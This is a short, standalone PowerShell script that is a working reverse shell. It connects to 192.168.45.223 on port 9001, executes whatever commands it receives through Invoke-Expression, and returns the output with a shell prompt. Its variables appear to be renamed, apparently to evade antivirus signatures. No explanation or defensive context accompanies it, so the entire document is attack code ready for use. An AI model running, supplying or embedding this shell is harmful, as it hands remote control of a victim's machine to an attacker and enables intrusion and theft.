$amit = New-Object System.Net.Sockets.TCPClient("192.168.45.223",9001);
$amit = $amit.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $amit.Read($bytes, 0, $bytes.Length)) -ne 0){;
$bruh = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$dback = (iex ". { $bruh } 2>&1" | Out-String );
$dback2  = $dback + "[" +$ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') +"]" + " PS > ";
$sdata =([text.encoding]::ASCII).GetBytes($dback2);
$amit.Write($sdata,0,$sdata.Length);
$amit.Flush()};
$amit.Close()
